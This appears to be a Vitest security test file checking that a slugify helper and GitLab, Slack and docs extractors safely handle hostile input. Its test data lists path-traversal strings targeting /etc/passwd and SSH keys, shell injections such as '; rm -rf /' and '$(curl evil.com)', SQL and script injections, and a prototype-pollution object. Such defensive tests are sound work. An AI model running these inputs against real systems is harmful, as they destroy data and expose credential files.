import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import path from "node:path";
import { slugify } from "../utils.js";
import { extractGitLabSignals } from "../extractors/gitlab.js";
import { extractSlackSignals } from "../extractors/slack.js";
import { extractDocsSignals } from "../extractors/docs.js";

const TMP_DIR = path.join(import.meta.dirname, "__tmp_security__");

beforeEach(() => {
  mkdirSync(TMP_DIR, { recursive: true });
});

afterEach(() => {
  rmSync(TMP_DIR, { recursive: true, force: true });
});

describe("slugify safety", () => {
  it("neutralizes path traversal sequences", () => {
    const dangerous = [
      "../../etc/passwd",
      "../../../root/.ssh/id_rsa",
      "..\\..\\windows\\system32",
      "foo/../../../etc/shadow",
    ];
    for (const input of dangerous) {
      const result = slugify(input);
      expect(result).not.toContain("..");
      expect(result).not.toContain("/");
      expect(result).not.toContain("\\");
    }
  });

  it("neutralizes shell injection characters", () => {
    const dangerous = [
      "; rm -rf /",
      "& whoami",
      "| cat /etc/passwd",
      "$(curl evil.com)",
      "`id`",
      "name\necho pwned",
      "name\x00null",
    ];
    for (const input of dangerous) {
      const result = slugify(input);
      expect(result).not.toMatch(/[;&|$`\n\x00(){}[\]<>'"\\]/);
    }
  });

  it("produces only safe characters (lowercase alphanumeric and hyphens)", () => {
    const inputs = [
      "Normal Name",
      "<script>alert(1)</script>",
      "Robert'); DROP TABLE users;--",
      "name@domain.com",
      "user+tag@example.com",
    ];
    for (const input of inputs) {
      const result = slugify(input);
      expect(result).toMatch(/^[a-z0-9-]*$/);
    }
  });
});

describe("GitLab extractor resilience", () => {
  it("handles prototype pollution attempts in JSON", () => {
    const data = [
      {
        body: "legit comment about the code",
        author: { name: "Dev" },
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
      },
    ];
    const filepath = path.join(TMP_DIR, "proto.json");
    writeFileSync(filepath, JSON.stringify(data));
    const signals = extractGitLabSignals(filepath, "Dev", false);
    // Should extract normally without being affected by pollution attempts
    expect(signals.totalComments).toBe(1);
    expect(signals.reviewComments[0]).toBe("legit comment about the code");
  });

  it("handles deeply nested structures without crashing", () => {
    // Array of objects that don't match expected structure
    const data = [{ nested: { deeply: { very: { deep: true } } } }];
    const filepath = path.join(TMP_DIR, "deep.json");
    writeFileSync(filepath, JSON.stringify(data));
    const signals = extractGitLabSignals(filepath, "Dev", false);
    expect(signals.totalComments).toBe(0);
  });

  it("handles very large comment bodies without crashing", () => {
    const data = [
      {
        body: "x".repeat(100_000),
        author: { name: "Dev" },
      },
    ];
    const filepath = path.join(TMP_DIR, "large.json");
    writeFileSync(filepath, JSON.stringify(data));
    const signals = extractGitLabSignals(filepath, "Dev", false);
    expect(signals.totalComments).toBe(1);
    expect(signals.reviewComments[0].length).toBe(100_000);
  });

  it("handles array at top level that isn't objects", () => {
    const data = [1, "string", null, true];
    const filepath = path.join(TMP_DIR, "primitives.json");
    writeFileSync(filepath, JSON.stringify(data));
    const signals = extractGitLabSignals(filepath, "Dev", false);
    expect(signals.totalComments).toBe(0);
  });

  it("handles non-array JSON (object at top level)", () => {
    const data = { key: "value" };
    const filepath = path.join(TMP_DIR, "object.json");
    writeFileSync(filepath, JSON.stringify(data));
    const signals = extractGitLabSignals(filepath, "Dev", false);
    expect(signals.totalComments).toBe(0);
  });
});

describe("Slack extractor resilience", () => {
  it("handles binary file content in JSON files", () => {
    mkdirSync(path.join(TMP_DIR, "ch"), { recursive: true });
    // Write binary-like content with a .json extension
    writeFileSync(path.join(TMP_DIR, "ch", "binary.json"), Buffer.from([0x00, 0x01, 0xFF, 0xFE]));
    const signals = extractSlackSignals(TMP_DIR, "dev", false);
    expect(signals.messages).toEqual([]);
  });

  it("handles JSON arrays with null/undefined items", () => {
    mkdirSync(path.join(TMP_DIR, "ch"), { recursive: true });
    writeFileSync(
      path.join(TMP_DIR, "ch", "nulls.json"),
      JSON.stringify([null, undefined, 42, "string"]),
    );
    const signals = extractSlackSignals(TMP_DIR, "dev", false);
    expect(signals.messages).toEqual([]);
  });

  it("handles messages with XSS-like content safely", () => {
    mkdirSync(path.join(TMP_DIR, "ch"), { recursive: true });
    writeFileSync(
      path.join(TMP_DIR, "ch", "xss.json"),
      JSON.stringify([
        {
          username: "dev",
          text: '<script>alert("xss")</script> this is a long enough message for the test',
        },
      ]),
    );
    const signals = extractSlackSignals(TMP_DIR, "dev", false);
    // Should extract the message as-is (it's data, not rendered)
    expect(signals.messages).toHaveLength(1);
    expect(signals.messages[0]).toContain("<script>");
  });
});

describe("Docs extractor resilience", () => {
  it("handles non-UTF8 file content gracefully", () => {
    mkdirSync(path.join(TMP_DIR, "docs"), { recursive: true });
    writeFileSync(
      path.join(TMP_DIR, "docs", "binary.md"),
      Buffer.from([0x80, 0x81, 0xFF, 0xFE, 0x00]),
    );
    // Should not throw
    const signals = extractDocsSignals(TMP_DIR, "Dev", false);
    expect(signals.authoredDocs).toBeDefined();
  });

  it("handles empty markdown files", () => {
    mkdirSync(path.join(TMP_DIR, "docs"), { recursive: true });
    writeFileSync(path.join(TMP_DIR, "docs", "empty.md"), "");
    const signals = extractDocsSignals(TMP_DIR, "Dev", false);
    expect(signals.authoredDocs).toHaveLength(0);
  });

  it("handles markdown with only frontmatter", () => {
    mkdirSync(path.join(TMP_DIR, "docs"), { recursive: true });
    writeFileSync(path.join(TMP_DIR, "docs", "frontmatter-only.md"), "---\nauthor: Dev\n---");
    const signals = extractDocsSignals(TMP_DIR, "Dev", false);
    expect(signals.authoredDocs).toHaveLength(1);
    // No paragraphs > 100 chars
    expect(signals.docExcerpts).toHaveLength(0);
  });
});
